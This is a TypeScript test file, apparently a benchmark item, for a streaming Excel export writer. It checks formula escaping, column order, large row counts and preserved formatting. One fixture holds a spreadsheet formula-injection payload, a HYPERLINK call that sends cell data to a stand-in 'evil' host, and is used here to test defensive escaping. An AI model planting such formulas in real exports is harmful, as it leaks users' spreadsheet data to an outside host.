// @vitest-environment node
/**
 * The streaming workbook writer behind the customer master export and the
 * field-update report (benchmark item 28). It replaces an in-memory builder whose
 * guarantees must carry over exactly: every cell formula-escaped, phones left
 * alone, a bold header, and a file the importer's parser reads back.
 */
import { describe, it, expect } from 'vitest';
import { buildWorkbookStreamed, loadExcelJS, openStreamedWorkbook, parseWorkbook } from '@/lib/excel';

async function* from<T>(xs: T[]) {
  for (const x of xs) yield x;
}

describe('buildWorkbookStreamed', () => {
  it('escapes formulas, leaves phones and negatives alone, and reads back through parseWorkbook', async () => {
    const { bytes, rowCount } = await buildWorkbookStreamed(
      ['name', 'phone'],
      from([
        { name: '=HYPERLINK("http://evil/?x="&A1)', phone: '+96898765432' },
        { name: '@SUM(A1:A2)', phone: '-12.5' },
        { name: 'Normal Shop Name', phone: '+968 9876 5432' },
      ]),
      'Test'
    );
    expect(rowCount).toBe(3);
    const [sheet] = await parseWorkbook(bytes);
    expect(sheet!.name).toBe('Test');
    expect(sheet!.headers).toEqual(['name', 'phone']);
    expect(sheet!.rows.map((r) => r.name)).toEqual([`'=HYPERLINK("http://evil/?x="&A1)`, `'@SUM(A1:A2)`, 'Normal Shop Name']);
    expect(sheet!.rows.map((r) => r.phone)).toEqual(['+96898765432', '-12.5', '+968 9876 5432']);
  });

  it('writes the fixed columns in order, blank where a row has no value, with a bold header', async () => {
    const { bytes } = await buildWorkbookStreamed(['a', 'b', 'c'], from([{ c: 3, a: 'x' }, { b: 'y' }]));
    const ExcelJS = await loadExcelJS();
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(bytes as unknown as Parameters<typeof wb.xlsx.load>[0]);
    const ws = wb.worksheets[0]!;
    expect(ws.getRow(1).values).toEqual([undefined, 'a', 'b', 'c']);
    expect(ws.getRow(1).font?.bold).toBe(true);
    expect([ws.getCell('A2').value, ws.getCell('B2').value, ws.getCell('C2').value]).toEqual(['x', null, 3]);
    expect([ws.getCell('A3').value, ws.getCell('B3').value]).toEqual([null, 'y']);
  });

  it('builds past the old 25,000-row cap', async () => {
    const n = 26_000;
    const rows = (async function* () {
      for (let i = 0; i < n; i++) yield { code: `C${i}`, qty: i };
    })();
    const { bytes, rowCount } = await buildWorkbookStreamed(['code', 'qty'], rows);
    expect(rowCount).toBe(n);
    const [sheet] = await parseWorkbook(bytes);
    expect(sheet!.rows).toHaveLength(n);
    expect(sheet!.rows[n - 1]).toEqual({ code: `C${n - 1}`, qty: n - 1 });
  }, 60_000);
});

describe('openStreamedWorkbook — what the field-update report needs survives streaming', () => {
  it('keeps fills, notes, hyperlinks, frozen panes, an autofilter and a second sheet', async () => {
    const { wb, finish } = await openStreamedWorkbook();
    const ws = wb.addWorksheet('Customers', { views: [{ state: 'frozen', xSplit: 2, ySplit: 1 }] });
    ws.columns = [
      { header: 'cust_code', key: 'cust_code', width: 14 },
      { header: 'gps_map', key: 'gps_map', width: 10 },
    ];
    ws.autoFilter = { from: { row: 1, column: 1 }, to: { row: 1, column: 2 } };
    const row = ws.addRow({ cust_code: 'NMWC-1', gps_map: { text: 'map', hyperlink: 'https://www.google.com/maps?q=23.5,58.3' } });
    row.getCell('cust_code').fill = { type: 'pattern', pattern: 'solid', fgColor: { argb: 'FFFFFF00' } };
    row.getCell('cust_code').note = 'was: — → now: x';
    row.commit();
    ws.commit();
    const second = wb.addWorksheet('Changes');
    second.columns = [{ header: 'field', key: 'field' }];
    second.addRow({ field: 'phone' }).commit();
    second.commit();
    const bytes = await finish();

    const ExcelJS = await loadExcelJS();
    const back = new ExcelJS.Workbook();
    await back.xlsx.load(bytes as unknown as Parameters<typeof back.xlsx.load>[0]);
    const c = back.getWorksheet('Customers')!;
    expect((c.getCell('A2').fill as { fgColor?: { argb?: string } }).fgColor?.argb).toBe('FFFFFF00');
    expect(String(c.getCell('A2').note)).toContain('was:');
    expect((c.getCell('B2').value as { hyperlink?: string }).hyperlink).toContain('google.com/maps');
    expect(c.views[0]).toMatchObject({ state: 'frozen', xSplit: 2, ySplit: 1 });
    expect(c.autoFilter).toBeTruthy();
    expect(back.getWorksheet('Changes')!.getCell('A2').value).toBe('phone');
  });
});
